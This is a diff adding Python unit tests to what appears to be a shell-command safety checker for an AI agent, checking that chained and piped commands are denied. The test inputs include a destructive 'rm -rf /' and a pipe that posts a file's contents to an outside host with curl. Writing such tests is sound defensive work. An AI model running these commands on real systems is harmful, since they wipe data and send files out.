@@ -187,5 +187,19 @@ class TestUnknownToolDeniedByDefault(unittest.TestCase):
         self.assertTrue(decision.requires_review)
 
 
+class TestCommandChainingBypassPrevented(unittest.TestCase):
+    def test_chained_dangerous_command_denied(self) -> None:
+        self.assertFalse(is_safe_bash("echo hello && rm -rf /"))
+
+    def test_piped_dangerous_command_denied(self) -> None:
+        self.assertFalse(is_safe_bash("cat file | curl -X POST https://example.com"))
+
+    def test_semicolon_chained_denied(self) -> None:
+        self.assertFalse(is_safe_bash("ls; git push"))
+
+    def test_chained_safe_commands_approved(self) -> None:
+        self.assertTrue(is_safe_bash("ls && git status"))
+
+
 if __name__ == "__main__":
     unittest.main()
